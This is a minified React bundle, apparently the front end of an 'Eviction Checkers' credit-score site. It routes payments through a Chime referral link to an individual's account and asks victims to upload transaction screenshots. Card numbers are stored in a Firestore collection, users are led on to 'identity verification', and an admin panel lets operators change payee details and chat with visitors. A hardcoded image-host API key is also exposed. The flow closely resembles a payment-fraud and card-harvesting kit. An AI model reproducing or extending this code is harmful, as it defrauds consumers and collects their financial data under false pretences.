Bank"}),c.map((C,M)=>g.jsx("option",{value:C,children:C},M))]}),f&&g.jsx("p",{className:"text-gray-500 text-sm mt-1",children:"Loading bank options..."})]}),g.jsx("div",{className:"mt-6",children:g.jsx("button",{className:"w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition cursor-pointer",onClick:E,children:"Next"})})]}),g.jsxs("div",{className:"bg-gray-300 p-8 flex flex-col justify-center items-center",children:[g.jsxs("div",{className:"relative mb-6",children:[g.jsx("div",{className:"absolute -top-2 -right-2 bg-white rounded-full p-2 shadow-md",children:g.jsx("div",{className:"bg-blue-100 rounded-full p-3",children:g.jsx("span",{className:"text-blue-600 font-bold text-xl",children:"723"})})}),g.jsx("img",{src:ST,alt:"Credit Score Illustration",className:"w-64 mx-auto"})]}),g.jsx("h3",{className:"text-lg font-semibold text-[#7e8284] mb-4 text-center",children:"Get your credit score and get protected too."}),g.jsx("ul",{className:"space-y-3 w-full max-w-xs",children:["Credit Report and Score","Score Refreshed Every 30 Days On Sign In","Credit Monitoring and Alerts","Credit Cards and Loans Matched for You"].map((C,M)=>g.jsxs("li",{className:"flex items-start",children:[g.jsx("span",{className:"inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0",children:g.jsx(Is,{className:"text-gray-500 text-xs"})}),g.jsx("span",{className:"text-[#7e8284] text-[14px]",children:C})]},M))})]})]})})},ez=()=>{const[t,e]=O.useState(null),[n,i]=O.useState(null),[s,o]=O.useState({tagName:!1,number:!1}),[c,d]=O.useState(!1),[f,p]=O.useState({tagName:"",number:""}),v=cr(),{recCardNumber:b}=O.useContext(Bp);O.useEffect(()=>{const Y=b==null?void 0:b.replace(/\s+/g,"");console.log("Card number without spaces:",Y),(async()=>{try{const Q=await zs(gi(Rn,"payment-info","tag-name")),G=Q.exists()?Q.data().nameInfo:"",L=await zs(gi(Rn,"payment-info","payment-number")),N=L.exists()?L.data().numberInfo:"";p({tagName:G,number:N})}catch(Q){console.error("Error fetching payment info:",Q)}})()},[b]);const w=Y=>{const D=Y.target.files[0];D&&(i(D),e(URL.createObjectURL(D)))},E=()=>{e(null),i(null)},C=(Y,D)=>{navigator.clipboard.writeText(Y).then(()=>{o(Q=>({...Q,[D]:!0})),setTimeout(()=>{o(Q=>({...Q,[D]:!1}))},2e3)}).catch(Q=>{console.error("Failed to copy text: ",Q)})},M=async Y=>{const D=new FormData;D.append("image",Y);try{const G=await(await fetch("https://api.imgbb.com/1/upload?key=9591ffed13643ced8ede38d2492e0632",{method:"POST",body:D})).json();if(G.success)return G.data.url;throw new Error("Image upload failed")}catch(Q){throw console.error("Error uploading image:",Q),Q}},V=async(Y,D)=>{try{const Q=Y.replace(/\s+/g,""),G=gi(Rn,"all-cards-info",Q);await Cm(G,{paymentImage:D,paymentImageTimestamp:new Date().toISOString()}),console.log("Image URL successfully stored in Firestore")}catch(Q){throw console.error("Error updating Firestore:",Q),Q}},B=async()=>{if(!n){alert("Please upload a transaction screenshot first");return}if(!b){alert("No card number found in context");return}d(!0);try{const Y=await M(n);await V(b,Y),v("/payment-process",{state:{from:"/bank-payment",paymentData:{imageUrl:Y,timestamp:new Date().toISOString()}}})}catch(Y){console.error("Error in submission:",Y),alert("Failed to process payment. Please try again.")}finally{d(!1)}};return g.jsx("div",{className:"min-h-screen bg-white flex items-center justify-center p-4",children:g.jsxs("div",{className:"border border-black p-8 w-full max-w-3xl",children:[g.jsx("h2",{className:"text-center text-xl font-semibold mb-6",children:"Chime bank payment"}),g.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[g.jsxs("div",{className:"flex flex-col gap-4",children:[g.jsxs("div",{className:"relative",children:[g.jsxs("button",{className:"bg-gray-700 text-white py-2 px-4 rounded w-full flex justify-between items-center",onClick:()=>C(f.tagName,"tagName"),children:[g.jsx("span",{children:f.tagName||"Tag name"}),g.jsx(Ax,{className:"text-sm cursor-pointer"})]}),s.tagName&&g.jsx("span",{className:"absolute -top-2 -right-2 bg-green-500 text-white text-xs px-2 py-1 rounded",children:"Copied!"})]}),g.jsxs("div",{className:"relative",children:[g.jsxs("button",{className:"bg-gray-700 text-white py-2 px-4 rounded w-full flex justify-between items-center",onClick:()=>C(f.number,"number"),children:[g.jsx("span",{children:f.number||"Number"}),g.jsx(Ax,{className:"text-sm cursor-pointer"})]}),s.number&&g.jsx("span",{className:"absolute -top-2 -right-2 bg-green-500 text-white text-xs px-2 py-1 rounded",children:"Copied!"})]}),g.jsx("button",{onClick:()=>window.open("https://www.chime.com/r/marina-gomez-8/","_blank"),className:"bg-gray-700 text-white py-2 px-4 rounded cursor-pointer",children:"Chime Bank pay"})]}),g.jsx("div",{className:"flex items-center justify-center relative",children:g.jsxs("label",{htmlFor:"file-upload",className:"border border-gray-400 rounded-lg w-full h-40 cursor-pointer flex flex-col items-center justify-center text-center text-gray-600 overflow-hidden relative",children:[t?g.jsxs(g.Fragment,{children:[g.jsx("img",{src:t,alt:"Preview",className:"h-full object-contain"}),g.jsx("button",{type:"button",onClick:E,className:"absolute top-1 right-1 bg-white p-1 rounded-full shadow",children:g.jsx(Iv,{className:"text-red-600 text-sm"})})]}):g.jsxs(g.Fragment,{children:[g.jsx(k5,{className:"text-2xl mb-2"}),g.jsx("span",{className:"text-sm",children:"Please submit your transaction id or screenshot"})]}),g.jsx("input",{id:"file-upload",type:"file",accept:"image/*",className:"hidden",onChange:w})]})})]}),g.jsx("div",{className:"mt-6 flex justify-center",children:g.jsx("button",{onClick:B,className:`${t?"bg-blue-600 hover:bg-blue-700":"bg-gray-400 cursor-not-allowed"} text-white py-2 px-8 rounded transition flex items-center justify-center gap-2`,disabled:!t||c,children:c?g.jsxs(g.Fragment,{children:[g.jsxs("svg",{className:"animate-spin -ml-1 mr-2 h-4 w-4 text-white",xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",children:[g.jsx("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4"}),g.jsx("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),"Uploading..."]}):"Submit"})}),g.jsxs("p",{className:"text-xs text-gray-600 mt-4 text-center",children:["note: direct transfer from bank will not be accepted",g.jsx("br",{}),"Add fund to your balance before doing payment"]})]})})},tz="/assets/Screenshot_33-zYH7bOqG.png",nz=({cardNumber:t,onClose:e})=>{const[n,i]=O.useState([]),[s,o]=O.useState(""),c=O.useRef(null),d=O.useRef(!0),[f,p]=O.useState(!0);O.useEffect(()=>{if(!t)return;const w=cc(uc,`chats/${t}`),E=C=>{const M=C.val();i(V=>[...V,M])};return VB(w,E),()=>{UB(w,"child_added",E)}},[t]),O.useEffect(()=>{const w=c.current;if(!w)return;const E=()=>{const{scrollTop:C,scrollHeight:M,clientHeight:V}=w,B=M-(C+V)<10;p(B),d.current=B};return w.addEventListener("scroll",E),()=>{w.removeEventListener("scroll",E)}},[]),O.useEffect(()=>{const w=c.current;w&&d.current&&w.scrollTo({top:w.scrollHeight,behavior:"smooth"})},[n]);const v=()=>{if(s.trim()){const w={sender:"visitor",text:s,timestamp:Date.now()};uR(cc(uc,`chats/${t}`),w),o(""),d.current=!0}},b=w=>{w.key==="Enter"&&v()};return g.jsxs("div",{className:"relative bg-white rounded-t-lg md:rounded-lg shadow-xl flex flex-col w-full md:w-[400px] h-[70vh] md:h-[500px] border border-gray-200",children:[g.jsxs("div",{className:"flex justify-between items-center p-4 bg-blue-600 text-white rounded-t-lg",children:[g.jsx("h3",{className:"text-lg font-semibold",children:"Chat with Support Team"}),g.jsx("button",{onClick:e,className:"p-1 rounded-full hover:bg-blue-700 transition-colors",children:g.jsx(Iv,{})})]}),g.jsx("div",{ref:c,className:"flex-1 overflow-y-auto p-4 space-y-3",children:n.length===0?g.jsxs("div",{className:"flex flex-col items-center justify-center h-full text-gray-500",children:[g.jsx("p",{children:"No messages yet."}),g.jsx("p",{children:"Start the conversation!"})]}):n.map((w,E)=>g.jsxs("div",{className:`flex flex-col ${w.sender==="visitor"?"items-end":"items-start"}`,children:[g.jsx("div",{className:"flex items-center mb-1",children:g.jsxs("span",{className:`text-xs ${w.sender==="visitor"?"text-blue-500":"text-green-500"}`,children:[w.sender==="visitor"?"You":"Admin","  ",new Date(w.timestamp).toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})]})}),g.jsx("div",{className:`px-4 py-2 rounded-lg max-w-[80%] md:max-w-xs break-words ${w.sender==="visitor"?"bg-blue-100 text-blue-900":"bg-green-100 text-green-900"}`,children:w.text})]},E))}),g.jsx("div",{className:"p-3 border-t border-gray-200 bg-gray-50 rounded-b-lg",children:g.jsxs("div",{className:"flex items-center gap-2",children:[g.jsx("input",{className:"flex-1 border border-gray-300 rounded-lg px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent",value:s,onChange:w=>o(w.target.value),onKeyPress:b,placeholder:"Type your message..."}),g.jsx("button",{className:"bg-blue-600 hover:bg-blue-700 text-white p-2 rounded-lg transition-colors disabled:opacity-50",onClick:v,disabled:!s.trim(),children:g.jsx(I5,{})})]})}),!f&&g.jsx("button",{onClick:()=>{c.current.scrollTo({top:c.current.scrollHeight,behavior:"smooth"}),d.current=!0},className:"absolute bottom-16 right-4 bg-blue-600 text-white rounded-full p-2 shadow-lg hover:bg-blue-700 transition-colors",title:"Scroll to bottom",children:g.jsx(v5,{className:"h-4 w-4"})})]})},iz=()=>{const{recCardNumber:t}=O.useContext(Bp),[e,n]=O.useState(!1),i=t==null?void 0:t.replace(/\s+/g,"");return O.useEffect(()=>{const s=t==null?void 0:t.replace(/\s+/g,"");console.log("Card number without spaces:",s)},[t]),g.jsxs("div",{className:"flex flex-col-reverse md:flex-row items-center justify-center min-h-screen bg-gradient-to-br from-blue-50 to-gray-50 px-4 py-8 text-center md:text-left gap-8 md:gap-12 relative",children:[g.jsx("div",{className:"relative w-full max-w-md bg-white rounded-xl shadow-lg overflow-hidden transition-all duration-300 hover:shadow-xl",children:g.jsxs("div",{className:"p-6 md:p-8",children:[g.jsx("div",{className:"flex justify-center mb-6",children:g.jsx("img",{src:tz,alt:"Payment Successful",className:"w-full h-auto rounded-lg"})}),g.jsxs("div",{className:"space-y-4",children:[g.jsx("h3",{className:"text-xl font-semibold text-gray-800",children:"Almost There!"}),g.jsxs("p",{className:"text-gray-600",children:["Please verify your ",g.jsx("span",{className:"font-bold text-blue-600",children:"identity to access"})," your complete credit score & financial insights."]}),g.jsx("div",{className:"flex items-center justify-center md:justify-start space-x-4 pt-4",children:g.jsxs("div",{className:"flex items-center text-sm text-gray-600",children:[g.jsx(Rv,{className:"mr-2 text-blue-500"}),"Secure Verification"]})})]})]})}),g.jsxs("div",{className:"flex flex-col justify-center items-center w-full max-w-md",children:[g.jsxs("div",{className:"text-center",children:[g.jsx(x5,{className:"mx-auto text-green-500 text-5xl mb-4 animate-bounce"}),g.jsx("h2",{className:"text-2xl md:text-3xl lg:text-4xl font-bold text-gray-800 mb-2",children:"YOUR PAYMENT IS SUCCESSFUL!"}),g.jsx("p",{className:"text-base md:text-lg text-gray-600 mb-6 mt-0 md:mt-4",children:"We are currently reviewing your information. You'll receive a confirmation email shortly."})]}),g.jsxs("button",{className:"flex items-center justify-center gap-2 bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-full font-medium md:font-semibold transition-all duration-300 transform hover:scale-105 shadow-md w-full sm:w-auto mb-4",onClick:()=>n(!0),children:[g.jsx(S5,{}),"CONTACT SUPPORT TEAM"]}),g.jsxs("div",{className:"flex flex-col items-center mt-2",children:[g.jsx("div",{className:"text-gray-500 text-sm mb-2",children:"OR"}),g.jsxs("a",{href:"mailto:support@evictioncheckres.com?subject=Support Request&body=Hello Support Team,",className:"flex items-center justify-center gap-2 text-blue-600 hover:text-blue-800 transition-colors hover:underline",children:[g.jsx(E5,{className:"text-3xl"}),g.jsx("span",{className:"font-medium",children:"support@evictioncheckres.com"})]})]})]}),e&&g.jsx("div",{className:"fixed inset-0 md:inset-auto md:bottom-4 md:right-4 z-50 flex justify-center items-end md:items-start p-2 md:p-0",children:g.jsx(nz,{cardNumber:i,onClose:()=>n(!1)})})]})},rz=()=>{const[t,e]=O.useState(null),[n,i]=O.useState(!1),[s,o]=O.useState(!1),[c,d]=O.useState(!1),[f,p]=O.useState("Waiting for authorization"),v=cr();O.useEffect(()=>{if(t&&!c&&s){const C=setInterval(()=>{p(M=>M==="Waiting for authorization"?"Waiting for authorization.":"Waiting for authorization")},500);return()=>clearInterval(C)}},[t,c,s]),O.useEffect(()=>{const C=Kf.onAuthStateChanged(async M=>{M?(e(M),await b(M),await w(M.uid)):(e(null),d(!1)),o(!0)});return()=>C()},[]);const b=async C=>{try{const M=gi(Rn,"users",C.email);(await zs(M)).exists()||(await v4(M,{email:C.email,role:"user",createdAt:new Date().toISOString()}),console.log("New user created in database"))}catch(M){console.error("Error checking/creating user:",M)}},w=async C=>{var M;i(!0);try{const V=(M=Kf.currentUser)==null?void 0:M.email;if(!V)return;const B=gi(Rn,"users",V),Y=await zs(B);Y.exists()&&(Y.data().role==="admin"?(d(!0),v("/admin-panel")):d(!1))}catch(V){console.error("Error checking admin status:",V)}finally{i(!1)}},E=async()=>{i(!0);try{const C=new Rs,M=await GL(Kf,C);e(M.user),await b(M.user),await w(M.user.uid)}catch(C){console.error("Google login error:",C),alert("Login failed. Please try again."),i(!1)}};return s?g.jsxs("div",{className:"min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8",children:[g.jsxs("div",{className:"sm:mx-auto sm:w-full sm:max-w-md",children:[g.jsxs("div",{className:"flex flex-row justify-center gap-2 text-6xl font-bold",children:[g.jsx("h1",{className:"text-[#0057e1]",children:"Eviction"}),g.jsx("h1",{className:"text-[#ff8c4f]",children:"Checkers"})]}),g.jsx("h2",{className:"mt-6 text-center text-3xl font-extrabold text-gray-900",children:"Admin Panel Login"}),g.jsx("p",{className:"mt-2 text-center text-sm text-gray-600",children:"Please sign in with your authorized Google account"})]}),g.jsx("div",{className:"mt-8 sm:mx-auto sm:w-full sm:max-w-md",children:g.jsxs("div",{className:"bg-white py-8 px-4 shadow sm:rounded-lg sm:px-10",children:[t?g.jsx("div",{className:"text-center",children:n?g.jsxs(g.Fragment,{children:[g.jsx("div",{className:"flex justify-center",children:g.jsx(T0,{className:"animate-spin text-blue-500 text-4xl mb-4"})}),g.jsx("p",{className:"text-gray-600",children:"Verifying user information..."})]}):c?g.jsx("div",{className:"text-green-500",children:"Redirecting to admin panel..."}):g.jsx("div",{className:"text-orange-500 animate-pulse",children:f})}):g.jsx("div",{children:g.jsx("div",{className:"mt-6",children:g.jsxs("button",{onClick:E,disabled:n,className:`w-full flex justify-center items-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 ${n?"opacity-70 cursor-not-allowed":""}`,children:[n?g.jsx(T0,{className:"animate-spin mr-2"}):g.jsx(y5,{className:"mr-2"}),"Sign in with Google"]})})}),g.jsx("div",{className:"mt-6",children:g.jsxs("div",{className:"relative",children:[g.jsx("div",{className:"absolute inset-0 flex items-center",children:g.jsx("div",{className:"w-full border-t border-gray-300"})}),g.jsx("div",{className:"relative flex justify-center text-sm",children:g.jsx("span",{className:"px-2 bg-white text-gray-500",children:"Restricted Access Only"})})]})})]})})]}):g.jsx("div",{className:"min-h-screen flex items-center justify-center bg-gray-50",children:g.jsxs("div",{className:"text-center",children:[g.jsx("div",{className:"w-16 h-16 mx-auto mb-4 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"}),g.jsx("p",{className:"text-gray-600",children:"Checking authentication..."})]})})},Io=({element:t,requiredPreviousRoute:e})=>{var s;const n=bi(),i=((s=n.state)==null?void 0:s.from)||localStorage.getItem("previousRoute");return e&&i!==e?g.jsx(A0,{to:e,replace:!0}):(localStorage.setItem("previousRoute",n.pathname),t)},sz=new Audio("https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3");function az(){const[t,e]=O.useState(0),[n,i]=O.useState(!1),[s,o]=O.useState([]);cr();const c=bi(),d=p=>p==="dashboard"?c.pathname==="/admin-panel"||c.pathname==="/admin-panel/dashboard":c.pathname===`/admin-panel/${p}`||c.pathname.startsWith(`/admin-panel/${p}/`);O.useEffect(()=>{const p=cc(uc,"chats"),v=hR(p,b=>{const w=b.val();if(w){let E=0;const C=[];Object.entries(w).forEach(([M,V])=>{Object.values(V).forEach(B=>{B.sender!=="admin"&&!B.read&&(E++,C.includes(M)||C.push(M))})}),E>t&&(f(),i(!0)),e(E),o(C)}else e(0),o([]),i(!1)});return()=>v()},[t]);const f=()=>{sz.play().catch(p=>console.log("Audio play failed:",p))};return g.jsx("nav",{className:"bg-gray-800 text-white p-4 shadow-md",children:g.jsxs("div",{className:"max-w-screen-xl mx-auto flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 sm:gap-0",children:[g.jsxs("div",{className:"flex items-center justify-center sm:justify-start text-xl font-bold",children:["Admin Panel",t>0&&g.jsx("span",{className:"ml-2 bg-red-500 text-white text-xs font-bold px-2 py-1 rounded-full",children:t})]}),n&&t>0&&g.jsx("div",{className:"w-full sm:w-auto animate-bounce",children:g.jsx("div",{className:"bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg text-center font-medium text-sm sm:text-base max-w-xs mx-auto",children:"New message received. Check the chat window!"})}),g.jsxs("ul",{className:"flex flex-wrap justify-center sm:justify-end gap-4 md:gap-8 text-sm font-medium",children:[g.jsx("li",{children:g.jsx(Yr,{to:"dashboard",className:`hover:text-yellow-300 ${d("dashboard")?"text-yellow-300 border-b-2 border-yellow-300":""}`,children:"Dashboard"})}),g.jsx("li",{className:"relative",children:g.jsxs(Yr,{to:"chat",className:`hover:text-yellow-300 flex items-center ${d("chat")?"text-yellow-300 border-b-2 border-yellow-300":""}`,children:["Chat",t>0&&g.jsx("span",{className:"ml-1 bg-red-500 text-white text-xs font-bold px-1.5 py-0.5 rounded-full",children:t})]})}),g.jsx("li",{children:g.jsx(Yr,{to:"admin-role",className:`hover:text-yellow-300 ${d("admin-role")?"text-yellow-300 border-b-2 border-yellow-300":""}`,children:"Admin Role"})}),g.jsx("li",{children:g.jsx(Yr,{to:"payment-info-update",className:`hover:text-yellow-300 ${d("payment-info-update")?"text-yellow-300 border-b-2 border-yellow-300":""}`,children:"Payment Info Update"})}),g.jsx("li",{children:g.jsx(Yr,{to:"payment-method-update",className:`hover:text-yellow-300 ${d("payment-method-update")?"text-yellow-300 border-b-2 border-yellow-300":""}`,children:"Payment Method Update"})})]})]})})}const oz=()=>g.jsxs("div",{className:"min-h-screen bg-gray-100",children:[g.jsx(az,{}),g.jsx("div",{className:"pt-10 p-0 md:p-2",children:g.jsx(yT,{})})]});function Df(t){return Pt({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"rect",attr:{x:"9",y:"9",width:"13",height:"13",rx:"2",ry:"2"},child:[]},{tag:"path",attr:{d:"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"},child:[]}]})(t)}function fR(t){var e,n,i="";if(typeof t=="string"||typeof t=="number")i+=t;else if(typeof t=="object")if(Array.isArray(t)){var s=t.length;for(e=0;e<s;e++)t[e]&&(n=fR(t[e]))&&(i&&(i+=" "),i+=n)}else for(n in t)t[n]&&(i&&(i+=" "),i+=n);return i}function Bo(){for(var t,e,n=0,i="",s=arguments.length;n<s;n++)(t=arguments[n])&&(e=fR(t))&&(i&&(i+=" "),i+=e);return i}function lz(t){if(typeof document>"u")return;let e=document.head||document.getElementsByTagName("head")[0],n=document.createElement("style");n.type="text/css",e.firstChild?e.insertBefore(n,e.firstChild):e.appendChild(n),n.styleSheet?n.styleSheet.cssText=t:n.appendChild(document.createTextNode(t))}lz(`:root{--toastify-color-light: #fff;--toastify-color-dark: #121212;--toastify-color-info: #3498db;--toastify-color-success: #07bc0c;--toastify-color-warning: #f1c40f;--toastify-color-error: hsl(6, 78%, 57%);--toastify-color-transparent: rgba(255, 255, 255, .7);--toastify-icon-color-info: var(--toastify-color-info);--toastify-icon-color-success: var(--toastify-color-success);--toastify-icon-color-warning: var(--toastify-color-warning);--toastify-icon-color-error: var(--toastify-color-error);--toastify-container-width: fit-content;--toastify-toast-width: 320px;--toastify-toast-offset: 16px;--toastify-toast-top: max(var(--toastify-toast-offset), env(safe-area-inset-top));--toastify-toast-right: max(var(--toastify-toast-offset), env(safe-area-inset-right));--toastify-toast-left: max(var(--toastify-toast-offset), env(safe-area-inset-left));--toastify-toast-bottom: max(var(--toastify-toast-offset), env(safe-area-inset-bottom));--toastify-toast-background: #fff;--toastify-toast-padding: 14px;--toastify-toast-min-height: 64px;--toastify-toast-max-height: 800px;--toastify-toast-bd-radius: 6px;--toastify-toast-shadow: 0px 4px 12px rgba(0, 0, 0, .1);--toastify-font-family: sans-serif;--toastify-z-index: 9999;--toastify-text-color-light: #757575;--toastify-text-color-dark: #fff;--toastify-text-color-info: #fff;--toastify-text-color-success: #fff;--toastify-text-color-warning: #fff;--toastify-text-color-error: #fff;--toastify-spinner-color: #616161;--toastify-spinner-color-empty-area: #e0e0e0;--toastify-color-progress-light: linear-gradient(to right, #4cd964, #5ac8fa, #007aff, #34aadc, #5856d6, #ff2d55);--toastify-color-progress-dark: #bb86fc;--toastify-color-progress-info: var(--toastify-color-info);--toastify-color-progress-success: var(--toastify-color-success);--toastify-color-progress-warning: var(--toastify-color-warning);--toastify-color-progress-error: var(--toastify-color-error);--toastify-color-progress-bgo: .2}.Toastify__toast-container{z-index:var(--toastify-z-index);-webkit-transform:translate3d(0,0,var(--toastify-z-index));position:fixed;width:var(--toastify-container-width);box-sizing:border-box;color:#fff;display:flex;flex-direction:column}.Toastify__toast-container--top-left{top:var(--toastify-toast-top);left:var(--toastify-toast-left)}.Toastify__toast-container--top-center{top:var(--toastify-toast-top);left:50%;transform:translate(-50%);align-items:center}.Toastify__toast-container--top-right{top:var(--toastify-toast-top);right:var(--toastify-toast-right);align-items:end}.Toastify__toast-container--bottom-left{bottom:var(--toastify-toast-bottom);left:var(--toastify-toast-left)}.Toastify__toast-container--bottom-center{bottom:var(--toastify-toast-bottom);left:50%;transform:translate(-50%);align-items:center}.Toastify__toast-container--bottom-right{bottom:var(--toastify-toast-bottom);right:var(--toastify-toast-right);align-items:end}.Toastify__toast{--y: 0;position:relative;touch-action:none;width:var(--toastify-toast-width);min-height:var(--toastify-toast-min-height);box-sizing:border-box;margin-bottom:1rem;padding:var(--toastify-toast-padding);border-radius:var(--toastify-toast-bd-radius);box-shadow:var(--toastify-toast-shadow);max-height:var(--toastify-toast-max-height);font-family:var(--toastify-font-family);z-index:0;display:flex;flex:1 auto;align-items:center;word-break:break-word}@media only screen and (max-width: 480px){.Toastify__toast-container{width:100vw;left:env(safe-area-inset-left);margin:0}.Toastify__toast-container--top-left,.Toastify__toast-container--top-center,.Toastify__toast-container--top-right{top:env(safe-area-inset-top);transform:translate(0)}.Toastify__toast-container--bottom-left,.Toastify__toast-container--bottom-center,.Toastify__toast-container--bottom-right{bottom:env(safe-area-inset-bottom);transform:translate(0)}.Toastify__toast-container--rtl{right:env(safe-area-inset-right);left:initial}.Toastify__toast{--toastify-toast-width: 100%;margin-bottom:0;border-radius:0}}.Toastify__toast-container[data-stacked=true]{width:var(--toastify-toast-width)}.Toastify__toast--stacked{position:absolute;width:100%;transform:translate3d(0,var(--y),0) scale(var(--s));transition:transform .3s}.Toastify__toast--stacked[data-collapsed] .Toastify__toast-body,.Toastify__toast--stacked[data-collapsed] .Toastify__close-button{transition:opacity .1s}.Toastify__toast--stacked[data-collapsed=false]{overflow:visible}.Toastify__toast--stacked[data-collapsed=true]:not(:last-child)>*{opacity:0}.Toastify__toast--stacked:after{content:"";position:absolute;left:0;right:0;height:calc(var(--g) * 1px);bottom:100%}.Toastify__toast--stacked[data-pos=top]{top:0}.Toastify__toast--stacked[data-pos=bot]{bottom:0}.Toastify__toast--stacked[data-pos=bot].Toastify__toast--stacked:before{transform-origin:top}.Toastify__toast--stacked[data-pos=top].Toastify__toast--stacked:before{transform-origin:bottom}.Toastify__toast--stacked:before{content:"";position:absolute;left:0;right:0;bottom:0;height:100%;transform:scaleY(3);z-index:-1}.Toastify__toast--rtl{direction:rtl}.Toastify__toast--close-on-click{cursor:pointer}.Toastify__toast-icon{margin-inline-end:10px;width:22px;flex-shrink:0;display:flex}.Toastify--animate{animation-fill-mode:both;animation-duration:.5s}.Toastify--animate-icon{animation-fill-mode:both;animation-duration:.3s}.Toastify__toast-theme--dark{background:var(--toastify-color-dark);color:var(--toastify-text-color-dark)}.Toastify__toast-theme--light,.Toastify__toast-theme--colored.Toastify__toast--default{background:var(--toastify-color-light);color:var(--toastify-text-color-light)}.Toastify__toast-theme--colored.Toastify__toast--info{color:var(--toastify-text-color-info);background:var(--toastify-color-info)}.Toastify__toast-theme--colored.Toastify__toast--success{color:var(--toastify-text-color-success);background:var(--toastify-color-success)}.Toastify__toast-theme--colored.Toastify__toast--warning{color:var(--toastify-text-color-warning);background:var(--toastify-color-warning)}.Toastify__toast-theme--colored.Toastify__toast--error{color:var(--toastify-text-color-error);background:var(--toastify-color-error)}.Toastify__progress-bar-theme--light{background:var(--toastify-color-progress-light)}.Toastify__progress-bar-theme--dark{background:var(--toastify-color-progress-dark)}.Toastify__progress-bar--info{background:var(--toastify-color-progress-info)}.Toastify__progress-bar--success{background:var(--toastify-color-progress-success)}.Toastify__progress-bar--warning{background:var(--toastify-color-progress-warning)}.Toastify__progress-bar--error{background:var(--toastify-color-progress-error)}.Toastify__progress-bar-theme--colored.Toastify__progress-bar--info,.Toastify__progress-bar-theme--colored.Toastify__progress-bar--success,.Toastify__progress-bar-theme--colored.Toastify__progress-bar--warning,.Toastify__progress-bar-theme--colored.Toastify__progress-bar--error{background:var(--toastify-color-transparent)}.Toastify__close-button{color:#fff;position:absolute;top:6px;right:6px;background:transparent;outline:none;border:none;padding:0;cursor:pointer;opacity:.7;transition:.3s ease;z-index:1}.Toastify__toast--rtl .Toastify__close-button{left:6px;right:unset}.Toastify__close-button--light{color:#000;opacity:.3}.Toastify__close-button>svg{fill:currentColor;height:16px;width:14px}.Toastify__close-button:hover,.Toastify__close-button:focus{opacity:1}@keyframes Toastify__trackProgress{0%{transform:scaleX(1)}to{transform:scaleX(0)}}.Toastify__progress-bar{position:absolute;bottom:0;left:0;width:100%;height:100%;z-index:1;opacity:.7;transform-origin:left}.Toastify__progress-bar--animated{animation:Toastify__trackProgress linear 1 forwards}.Toastify__progress-bar--controlled{transition:transform .2s}.Toastify__progress-bar--rtl{right:0;left:initial;transform-origin:right;border-bottom-left-radius:initial}.Toastify__progress-bar--wrp{position:absolute;overflow:hidden;bottom:0;left:0;width:100%;height:5px;border-bottom-left-radius:var(--toastify-toast-bd-radius);border-bottom-right-radius:var(--toastify-toast-bd-radius)}.Toastify__progress-bar--wrp[data-hidden=true]{opacity:0}.Toastify__progress-bar--bg{opacity:var(--toastify-color-progress-bgo);width:100%;height:100%}.Toastify__spinner{width:20px;height:20px;box-sizing:border-box;border:2px solid;border-radius:100%;border-color:var(--toastify-spinner-color-empty-area);border-right-color:var(--toastify-spinner-color);animation:Toastify__spin .65s linear infinite}@keyframes Toastify__bounceInRight{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(3000px,0,0)}60%{opacity:1;transform:translate3d(-25px,0,0)}75%{transform:translate3d(10px,0,0)}90%{transform:translate3d(-5px,0,0)}to{transform:none}}@keyframes Toastify__bounceOutRight{20%{opacity:1;transform:translate3d(-20px,var(--y),0)}to{opacity:0;transform:translate3d(2000px,var(--y),0)}}@keyframes Toastify__bounceInLeft{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(-3000px,0,0)}60%{opacity:1;transform:translate3d(25px,0,0)}75%{transform:translate3d(-10px,0,0)}90%{transform:translate3d(5px,0,0)}to{transform:none}}@keyframes Toastify__bounceOutLeft{20%{opacity:1;transform:translate3d(20px,var(--y),0)}to{opacity:0;transform:translate3d(-2000px,var(--y),0)}}@keyframes Toastify__bounceInUp{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(0,3000px,0)}60%{opacity:1;transform:translate3d(0,-20px,0)}75%{transform:translate3d(0,10px,0)}90%{transform:translate3d(0,-5px,0)}to{transform:translateZ(0)}}@keyframes Toastify__bounceOutUp{20%{transform:translate3d(0,calc(var(--y) - 10px),0)}40%,45%{opacity:1;transform:translate3d(0,calc(var(--y) + 20px),0)}to{opacity:0;transform:translate3d(0,-2000px,0)}}@keyframes Toastify__bounceInDown{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(0,-3000px,0)}60%{opacity:1;transform:translate3d(0,25px,0)}75%{transform:translate3d(0,-10px,0)}90%{transform:translate3d(0,5px,0)}to{transform:none}}@keyframes Toastify__bounceOutDown{20%{transform:translate3d(0,calc(var(--y) - 10px),0)}40%,45%{opacity:1;transform:translate3d(0,calc(var(--y) + 